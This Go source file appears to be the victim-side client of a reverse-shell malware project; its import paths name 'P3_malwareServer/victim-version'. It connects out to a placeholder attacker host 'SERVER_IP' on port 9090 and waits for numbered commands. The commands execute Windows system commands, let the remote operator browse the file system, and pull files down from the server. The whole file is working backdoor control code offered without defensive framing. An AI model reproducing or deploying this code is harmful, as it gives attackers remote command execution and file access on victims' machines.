package main

import (
	"bufio"
	"fmt"
	"log"
	"strings"

	ExecuteSystemCommandWindows "github.com/ReflectionShade/base/P3_malwareServer/victim-version/core/ExecuteSystemCommandWindows"
	"github.com/ReflectionShade/base/P3_malwareServer/victim-version/core/download"
	handleConnection "github.com/ReflectionShade/base/P3_malwareServer/victim-version/core/handleConnection"
	"github.com/ReflectionShade/base/P3_malwareServer/victim-version/core/move"
)

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "SERVER_IP"
	Port := "9090"
	connection, err := handleConnection.ConnectionWithServer(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)
		case user_input == "2":
			fmt.Println("[+] File system navigation")
			err = move.NavigateFileSystem(connection)
			DisplayError(err)
		case user_input == "3":
			fmt.Println("[+] Downloading file from Server")
			err = download.DownloadFromServer(connection)
			if err != nil {
				fmt.Println("[-] Failed to download file from server: ", err)
			}

		case user_input == "99":
			fmt.Println("[+] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid input , try agian")
		}

	}

}
